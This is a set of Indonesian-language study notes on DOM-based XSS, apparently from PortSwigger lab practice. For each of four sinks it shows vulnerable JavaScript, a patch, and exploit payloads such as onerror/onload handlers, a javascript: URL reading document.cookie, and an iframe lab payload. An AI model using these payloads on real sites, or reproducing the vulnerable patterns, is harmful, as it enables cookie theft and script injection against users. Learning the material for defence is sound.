# 1. XSS Payload
    <script>alert(1)</script>
# 2. DOM XSS
- DOM XSS Tergantung pada sink nya
  ## 1. document.write sink
  memanfaatkan unsanitized query pada searching yang memungkan attacker melakukan penitupan atribut src pada tag <img> dan menyisipkan fungsi berbahaya (event handler).
      
     Contoh source code:
     ```html
     <img src="...?searchTerms=INPUT">
     ```
     exploit
    - ` "><svg onload=alert(1)>`
    - `" onload="alert()`

    Contoh Vuln pada javascript
  
  ```js
  function trackSearch(query) {
       document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
  }
  var query = (new URLSearchParams(window.location.search)).get('search');
   if(query) {
      trackSearch(query);
  }   
  ```
  
  `document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');`
   Menerima Teks Mentah: document.write akan mengambil string apa pun di dalamnya dan langsung menerjemahkannya sebagai kode HTML aktif di browser

  patching

  ```js
  function trackSearch(query) {

    const img = document.createElement('img');
    
    img.src = '/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(query);
    
    document.body.appendChild(img);
  }
  ```
  atau gunakan `encodeURIComponent` jika terpaksa menggunakan document.write
  
  ## 2. innerHTML sink
  Properti .innerHTML akan execute string apa pun yang dimasukkan ke dalamnya sebagai kode HTML. Jika attacker mengirim teks yang mengandung tag <script> atau elemen HTML dengan event handler          berbahaya, browser korban akan langsung mengeksekusinya.
  
  Contoh source code:
   ```html
   <div id="searchMessage">INPUT</div>
   ```
    ```js
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }                
    ```

  contoh patch:
    ```js
    function doSearchQuery(query) {
        document.getElementById('searchMessage').textContent = query;
    }
    ```
    
   exploit
  -  `<img src=x onerror=alert(1)>`
  - `<svg onload=alert(1)>`
 
  ## 3. .attr("href") sink
  
  Contoh source code yang vuln

  ```js
    $(function() {
        $('#backLink').attr("href", 
            (new URLSearchParams(window.location.search)).get('returnPath')
        );
    });
  ```
  
  ```html
  <a id="backLink" href="/idi">Back</a>
  ```
  
  Atribut href pada tag tautan (<a>) dapat menerima skema protokol javascript:. Jika penyerang memanipulasi parameter URL, mereka bisa menyuntikkan kode JavaScript yang akan langsung dieksekus ketika pengguna mengklik tombol "Back" tersebut.

  Hasilnya di DOM
    ```html
    <!-- Sebelum -->
    <a id="backLink" href="">Back</a>
    
    <!-- Sesudah, misal ?returnPath=/home -->
    <a id="backLink" href="/home">Back</a>
    ```

  Exploit:
  - `javascript:alert(document.cookie)`

  ## 4. jQuery sink
  Penyebab utamanya adalah penggunaan fungsi selektor $() (atau jQuery()) sebagai Sink yang dipadukan dengan data mentah dari window.location.hash sebagai Source.
  ```js
     <script>
      $(window).on('hashchange', function(){
          var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
          if (post) post.get(0).scrollIntoView();
      });
    </script>
  ```
  exploit:
  - `<img src=x onerror=alert(document.cookie)>`
  - `<iframe src="https://0a13001f041c45ba8030035b006d0065.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
# 3. Stored XSS

# 4. Reflected XSS

    
